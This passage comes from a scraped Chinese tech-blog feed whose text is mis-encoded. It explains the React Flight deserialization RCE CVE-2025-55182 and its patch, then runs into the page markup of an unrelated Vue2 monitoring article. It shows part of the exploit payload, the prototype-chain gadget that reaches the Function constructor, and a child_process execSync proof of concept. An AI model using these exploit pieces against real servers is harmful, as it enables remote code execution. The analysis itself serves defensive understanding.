        <span class="hljs-comment">// â€œæ­¦å™¨â€ï¼šæŒ‡å‘ Function æ„é€ å‡½æ•°çš„â€œå°å·¥å…·â€ (Gadget)</span>
        <span class="hljs-string">'_formData'</span>: {
            <span class="hljs-string">'get'</span>: <span class="hljs-string">'$3:constructor:constructor'</span>
        },
    }
}
</code></pre>
<p>è¿™ä¸ª <code>payload</code> çš„æ ¸å¿ƒæ€æƒ³æ˜¯åˆ©ç”¨ Flight åè®®çš„å¼•ç”¨æœºåˆ¶ï¼ˆ<code>$</code> ç¬¦å·ï¼‰ï¼Œå°†ä¸€å †æ™®é€šçš„æ•°æ®å¯¹è±¡ï¼ˆ<code>'1'</code>, <code>'4'</code> ç­‰ï¼‰åŒ…è£…æ‰“æ‰®æˆ React å†…éƒ¨å¤„ç†æµç¨‹ä¸­çš„å…³é”®è§’è‰²ï¼Œæ¯”å¦‚ <code>Chunk</code>ï¼ˆæ•°æ®å—ï¼‰å’Œ <code>Response</code>ï¼ˆå“åº”å¯¹è±¡ï¼‰ï¼Œä»è€Œéª—è¿‡æœåŠ¡å™¨çš„è§£æå™¨ã€‚</p>
<h3 data-id="heading-6">2. å·å–â€œä¸‡èƒ½é’¥åŒ™â€ï¼ˆ<code>Function</code> æ„é€ å‡½æ•°ï¼‰</h3>
<p>åœ¨ JavaScript çš„ä¸–ç•Œé‡Œï¼Œ<code>eval()</code> å‡½æ•°å› ä¸ºèƒ½ç›´æ¥æ‰§è¡Œå­—ç¬¦ä¸²ä»£ç ï¼Œæ—©å·²è‡­åæ˜­è‘—ã€‚ä½†å®ƒæœ‰ä¸ªâ€œå…„å¼Ÿâ€â€”â€”<code>Function()</code> æ„é€ å‡½æ•°ï¼ŒåŒæ ·èƒ½å®ç°åŠ¨æ€ä»£ç æ‰§è¡Œï¼Œå´æ›´å®¹æ˜“è¢«å¿½è§†ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¿™ä¸¤ç§æ–¹å¼éƒ½èƒ½æ‰§è¡Œå­—ç¬¦ä¸²é‡Œçš„ä»£ç </span>
<span class="hljs-built_in">eval</span>(<span class="hljs-string">'console.log("Hello from eval")'</span>);

<span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>(<span class="hljs-string">'console.log("Hello from Function constructor")'</span>)();
</code></pre>
<p>æ”»å‡»è€…çš„ç›®æ ‡ï¼Œå°±æ˜¯æ‹¿åˆ°è¿™ä¸ª <code>Function</code> æ„é€ å‡½æ•°ã€‚ä»–ä»¬æ˜¯æ€ä¹ˆåšåˆ°çš„å‘¢ï¼Ÿç­”æ¡ˆè—åœ¨ <code>payload</code> çš„ <code>'4'</code> å·å¯¹è±¡é‡Œï¼š</p>
<p><code>'get': '$3:constructor:constructor'</code></p>
<p>å½“ <code>react-server-dom</code> çš„è§£æå™¨çœ‹åˆ°è¿™ä¸ªå¼•ç”¨æ—¶ï¼Œå®ƒä¼šè¿›è¡Œä¸€åœºæƒŠå¿ƒåŠ¨é­„çš„â€œåŸå‹é“¾æ”€çˆ¬â€ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A("$3") -- è§£æä¸º --&gt; B("ç©ºæ•°ç»„ []");
    B -- .constructor --&gt; C(æ•°ç»„çš„æ„é€ å‡½æ•° Array);
    C -- .constructor --&gt; D(Array æ„é€ å‡½æ•°çš„æ„é€ å‡½æ•°&lt;br&gt;å³å…¨å±€ Function å¯¹è±¡);
    D -- èµ‹å€¼ç»™ --&gt; E(_formData.get å±æ€§);
</code></pre>
<p>é€šè¿‡ä¸¤æ¬¡ <code>.constructor</code> çš„è®¿é—®ï¼Œæ”»å‡»è€…ä»ä¸€ä¸ªå¹³å¹³æ— å¥‡çš„ç©ºæ•°ç»„ <code>[]</code> å‡ºå‘ï¼Œæœ€ç»ˆæ‘¸åˆ°äº† JavaScript çš„â€œä¸‡èƒ½é’¥åŒ™â€â€”â€”å…¨å±€ <code>Function</code> å¯¹è±¡ï¼</p>
<p>ç°åœ¨ï¼Œæ”»å‡»è€…çš„çŠ¶æ€æ˜¯ï¼š</p>
<ul>
<li><strong>â€œå¼¹è¯â€å·²ä¸Šè†›</strong>ï¼šæ¶æ„ä»£ç å­—ç¬¦ä¸² <code>require('child_process')...</code> å­˜æ”¾åœ¨ <code>_prefix</code> å±æ€§ä¸­ã€‚</li>
<li><strong>â€œæ­¦å™¨â€å·²åˆ°æ‰‹</strong>ï¼š<code>_formData.get</code> å±æ€§å·²ç»å˜æˆäº† <code>Function</code> æ„é€ å‡½æ•°ã€‚</li>
</ul>
<p>è‡³æ­¤ä¸‡äº‹ä¿±å¤‡ï¼Œåªæ¬ ä¸œé£ã€‚</p>
<h3 data-id="heading-7">3. ç¬¬ä¸‰æ­¥ï¼šå¼•çˆ†â€œé€»è¾‘ç‚¸å¼¹â€ (è§¦å‘ RCE)</h3>
<p>æœ€åçš„å¼•çˆ†ç‚¹ï¼Œéšè—åœ¨ <code>react-server-dom</code> åŒ…å¤„ç† Flight æ•°æ®çš„æŸä¸ªå‡½æ•°ï¼ˆå¦‚ <code>parseModel</code>ï¼‰ä¸­ï¼ˆå·²ç®€åŒ–ï¼‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// react-server-dom-webpack/server.node.js (ç®€åŒ–å)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">resolveModel</span>(<span class="hljs-params">response, id, model</span>) {
  <span class="hljs-comment">// ... çœç•¥å¤§é‡ä»£ç  ...</span>

  <span class="hljs-keyword">const</span> value = model.<span class="hljs-property">value</span>; <span class="hljs-comment">// value å¯èƒ½æ˜¯ '{"then":"$B3"...}'</span>

  <span class="hljs-comment">// å½“è§£æå™¨é‡åˆ° '$B' å¼€å¤´çš„ç‰¹æ®ŠæŒ‡ä»¤æ—¶</span>
  <span class="hljs-keyword">if</span> (value[<span class="hljs-number">0</span>] === <span class="hljs-string">'$'</span> &amp;&amp; value[<span class="hljs-number">1</span>] === <span class="hljs-string">'B'</span>) {
    <span class="hljs-keyword">const</span> props = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(value.<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>)); <span class="hljs-comment">// props ä¼šè¢«è§£æä¸º 3</span>

    <span class="hljs-comment">// è‡´å‘½çš„å¼•çˆ†ç‚¹</span>
    <span class="hljs-keyword">return</span> response.<span class="hljs-property">_formData</span>.<span class="hljs-title function_">get</span>(response.<span class="hljs-property">_prefix</span> + props.<span class="hljs-title function_">toString</span>());
  }

  <span class="hljs-comment">// ...</span>
}
</code></pre>
<p>å½“æˆ‘ä»¬çš„æ¶æ„ <code>payload</code> è¢«é€åˆ°è¿™é‡Œæ—¶ï¼Œä¸€åœºâ€œå®Œç¾çš„é£æš´â€å½¢æˆäº†ï¼š</p>
<ol>
<li>è§£æå™¨å¤„ç†åˆ°å¯¹è±¡ <code>'1'</code> çš„ <code>value</code> å±æ€§ï¼Œå‘ç°é‡Œé¢æœ‰ <code>'$B3'</code> è¿™ä¸ªç‰¹æ®ŠæŒ‡ä»¤ï¼Œè¿›å…¥äº† <code>if</code> åˆ†æ”¯ã€‚</li>
<li><code>props</code> è¢«è§£æä¸ºæ•°å­— <code>3</code>ã€‚</li>
<li>æœ€å…³é”®çš„ä¸€è¡Œä»£ç è¢«æ‰§è¡Œï¼š<code>response._formData.get(response._prefix + props.toString())</code>ã€‚</li>
</ol>
<p>æˆ‘ä»¬æŠŠå˜é‡æ›¿æ¢æˆæ”»å‡»è€…å‡†å¤‡å¥½çš„ä¸œè¥¿ï¼š</p>
<ul>
<li><code>response</code>ï¼šå°±æ˜¯æˆ‘ä»¬ä¼ªé€ çš„ <code>'4'</code> å·å¯¹è±¡ã€‚</li>
<li><code>response._formData.get</code>ï¼šå°±æ˜¯ <code>Function</code> æ„é€ å‡½æ•°ã€‚</li>
<li><code>response._prefix</code>ï¼šå°±æ˜¯æ¶æ„ä»£ç å­—ç¬¦ä¸² <code>require('child_process')...</code>ã€‚</li>
<li><code>props.toString()</code>ï¼šå°±æ˜¯å­—ç¬¦ä¸² <code>'3'</code>ã€‚</li>
</ul>
<p>æ‰€ä»¥ï¼Œè¿™è¡Œä»£ç å®é™…ä¸Šç­‰ä»·äºï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>(<span class="hljs-string">'require("child_process").execSync("touch /tmp/pwned"); //'</span> + <span class="hljs-string">'3'</span>)
</code></pre>
<p>ä¸€ä¸ªæ–°çš„åŒ¿åå‡½æ•°è¢«åŠ¨æ€åˆ›å»ºï¼Œå‡½æ•°ä½“å°±æ˜¯æ”»å‡»è€…æ³¨å…¥çš„æ¶æ„ä»£ç ã€‚</p>
<p>ç”±äº React å†…éƒ¨çš„ Promise é“¾å¤„ç†æœºåˆ¶ï¼Œè¿™ä¸ªåˆšåˆšè¯ç”Ÿçš„å‡½æ•°ä¼šè¢«ç«‹å³è°ƒç”¨æ‰§è¡Œã€‚</p>
<p>æ”»å‡»è€…æˆåŠŸåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œäº†ä»»æ„ä»£ç ï¼ŒRCE è¾¾æˆã€‚æœåŠ¡å™¨çš„æ§åˆ¶æƒå°±æ­¤æ˜“æ‰‹ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[æ¥æ”¶æ¶æ„ Flight æ•°æ®åŒ…] --&gt; B{è§£æ Payload};
    B --&gt; C(æŒ‰å¼•ç”¨ '$3:constructor:constructor' æŸ¥æ‰¾);
    C --&gt; D[è·å¾— Function æ„é€ å‡½æ•°å¹¶èµ‹å€¼ç»™ _formData.get];
    B --&gt; E[è§£æåˆ° '$B3' æŒ‡ä»¤];
    E --&gt; F["æ‰§è¡Œ _formData.get(_prefix + '3')"];
    F --&gt; G["ç­‰ä»·äº Function('æ¶æ„ä»£ç ' + '3')()"];
    G --&gt; H[æ¶æ„ä»£ç åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œ];
    H --&gt; I((RCE æˆåŠŸ));
</code></pre>
<h2 data-id="heading-8">ä¸‰ã€ä¿®å¤æ–¹æ¡ˆ</h2>
<p>åœ¨å¦‚æ­¤ä¸¥é‡çš„æ¼æ´é¢å‰ï¼ŒReact å›¢é˜Ÿçš„å“åº”æ˜¯è¿…é€Ÿçš„ã€‚ä»–ä»¬å¾ˆå¿«å‘å¸ƒäº†è¡¥ä¸ï¼Œä¿®å¤äº† React2Shellã€‚é‚£ä¹ˆï¼Œä»–ä»¬æ˜¯å¦‚ä½•ä¿®å¤çš„å‘¢ï¼Ÿ</p>
<h3 data-id="heading-9">ä¿®å¤çš„æ ¸å¿ƒæ€æƒ³ï¼šâ€œä¸å†ä¿¡ä»»â€</h3>
<p>è¿™æ¬¡æ¼æ´çš„æ ¹æºåœ¨äºå¯¹å®¢æˆ·ç«¯è¾“å…¥æ•°æ®çš„â€œè¿‡åº¦ä¿¡ä»»â€ã€‚å› æ­¤ï¼Œä¿®å¤çš„æ ¸å¿ƒæ€æƒ³å°±é¡ºç†æˆç« åœ°å˜æˆäº†â€”â€”<strong>â€œä¸å†ä¿¡ä»»â€</strong>ã€‚</p>
<p>å…·ä½“çš„ä¿®å¤æªæ–½å¯ä»¥æ€»ç»“ä¸ºä¸‰æ¿æ–§ï¼š</p>
<ol>
<li>
<p><strong>å¢å¼ºéªŒè¯</strong>ï¼šåœ¨ååºåˆ—åŒ– Flight æ•°æ®æµçš„æ¯ä¸€æ­¥ï¼Œéƒ½åŠ å…¥äº†ä¸¥æ ¼çš„ç±»å‹å’Œæ ¼å¼æ ¡éªŒã€‚è§£æå™¨ä¸å†æ˜¯â€œç›²ç›®â€æ‰§è¡Œï¼Œè€Œæ˜¯åƒä¸€ä¸ªä¸¥æ ¼çš„å®‰æ£€å‘˜ï¼Œæ£€æŸ¥æ¯ä¸ªâ€œåŒ…è£¹â€çš„å°ºå¯¸ã€å½¢çŠ¶ã€å†…å®¹æ˜¯å¦ç¬¦åˆè§„å®šï¼Œä»»ä½•ä¸ç¬¦åˆé¢„æœŸçš„å¯ç–‘æ•°æ®éƒ½ä¼šè¢«ç›´æ¥æ‹’ç»ã€‚</p>
</li>
<li>
<p><strong>é˜»æ–­åŸå‹é“¾</strong>ï¼šè¡¥ä¸ç‰¹åˆ«å°å µäº†é€šè¿‡ <code>.constructor</code> å±æ€§è¿›è¡ŒåŸå‹é“¾æ”€çˆ¬çš„è·¯å¾„ã€‚è¿™æ„å‘³ç€ï¼Œæ”»å‡»è€…æ— æ³•å†é€šè¿‡ <code>[].constructor.constructor</code> è¿™ç§æ–¹å¼è½»æ˜“åœ°æ‹¿åˆ° <code>Function</code> æ„é€ å‡½æ•°æˆ–å…¶ä»–å±é™©çš„å…¨å±€å¯¹è±¡ã€‚é€šå¾€â€œä¸‡èƒ½é’¥åŒ™â€çš„å¯†é“è¢«å½»åº•å µæ­»äº†ã€‚</p>
</li>
<li>
<p><strong>éš”ç¦»å†…éƒ¨çŠ¶æ€</strong>ï¼šä¿®æ”¹äº†è§£æé€»è¾‘ï¼Œä¸¥æ ¼é™åˆ¶äº†åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯¹ React å†…éƒ¨çŠ¶æ€å¯¹è±¡ï¼ˆå¦‚ <code>_response</code>ï¼‰çš„è®¿é—®å’Œä¿®æ”¹ã€‚è¿™ç›¸å½“äºç»™è§£æå™¨çš„æ ¸å¿ƒåŒºåŸŸåŠ äº†ä¸€é“â€œé˜²ç«å¢™â€ï¼Œé˜²æ­¢æ”»å‡»è€…é€šè¿‡ä¼ªé€ çš„æ•°æ®æ¥ç¯¡æ”¹å…¶å†…éƒ¨è¡Œä¸ºã€‚</p>
</li>
</ol>
<h2 data-id="heading-10">å››ã€æ€»ç»“</h2>
<p>CVE-2025-55182 æ¼æ´è™½ç„¶å·²ç»è¢«ä¿®å¤ï¼Œä½†å®ƒç»™æˆ‘ä»¬æ‰€æœ‰å¼€å‘è€…ï¼Œå°¤å…¶æ˜¯å‰ç«¯å¼€å‘è€…ï¼Œæ•²å“äº†ä¸€è®°å“äº®çš„è­¦é’Ÿï¼š</p>
<blockquote>
<p><strong>æ°¸è¿œä¸è¦ä¿¡ä»»æ¥è‡ªå¤–éƒ¨çš„ä»»ä½•æ•°æ®</strong></p>
</blockquote>
<p>æ— è®ºæ˜¯ç”¨æˆ·çš„è¾“å…¥ã€API çš„è¿”å›ï¼Œè¿˜æ˜¯åƒ Flight è¿™æ ·çœ‹ä¼¼â€œå†…éƒ¨â€çš„åè®®æ•°æ®ï¼Œåªè¦å®ƒæ¥æºäºä½ çš„åº”ç”¨ä¹‹å¤–ï¼Œå°±å¿…é¡»è¢«è§†ä¸ºæœ‰æ½œåœ¨å¨èƒçš„ã€‚ä¸å®‰å…¨ååºåˆ—åŒ–æ¼æ´çš„æœ¬è´¨ï¼Œå°±æ˜¯è¿èƒŒäº†è¿™æ¡æ³•åˆ™ï¼Œç ´åäº†å®‰å…¨çš„åŸºçŸ³ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue2æ€ä¹ˆæ­å»ºå‰ç«¯æ€§èƒ½/é”™è¯¯/è¡Œä¸ºç›‘æ§ä½“ç³»]]></title>    <link>https://juejin.cn/post/7582846276505747494</link>    <guid>https://juejin.cn/post/7582846276505747494</guid>    <pubDate>2025-12-12T16:55:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582846276505747494" data-draft-id="7582422818311716915" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue2æ€ä¹ˆæ­å»ºå‰ç«¯æ€§èƒ½/é”™è¯¯/è¡Œä¸ºç›‘æ§ä½“ç³»"/> <meta itemprop="keywords" content="ç›‘æ§,Vue.js,é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-12T16:55:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Aniugel"/> <meta itemprop="url" content="https://juejin.cn/user/3034307824198407"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue2æ€ä¹ˆæ­å»ºå‰ç«¯æ€§èƒ½/é”™è¯¯/è¡Œä¸ºç›‘æ§ä½“ç³»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3034307824198407/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Aniugel
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-12T16:55:20.000Z" title="Fri Dec 12 2025 16:55:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body 